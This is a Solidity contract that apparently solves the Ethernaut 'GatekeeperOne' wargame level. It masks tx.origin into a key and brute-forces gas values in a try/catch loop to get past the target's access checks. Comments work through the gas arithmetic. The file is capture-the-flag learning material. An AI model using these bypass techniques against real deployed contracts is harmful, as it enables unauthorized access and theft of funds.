pragma solidity ^0.8.0;

import { GatekeeperOne } from "./GatekeeperOne.sol";

contract GateKeeperSolver {
    GatekeeperOne gateKeeper;
  constructor(address gateKeeperAddress) {
    gateKeeper = GatekeeperOne(gateKeeperAddress);
  }

  function solve() public {
    bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    // https://www.evm.codes/?fork=shanghai
    // caller 2
    // origin 2
    // revert 0 
    // EQ 3
    // NOT 3
    // total 10
    // 8191 + 10 = 8201 + 2100 = 10301
    // 8191 * 10 = 81910 + 10 = 81920 + 2100 = 84020
    for (uint256 i = 0; i < 500; i++) {
        try gateKeeper.enter{gas: i+150+8191*3}(key) {
            break;
        } catch {
            continue;
        
        }
        // if (result) {
        //     break;
        // }
    }
    //gateKeeper.enter{gas: 84020}(key);
  }

}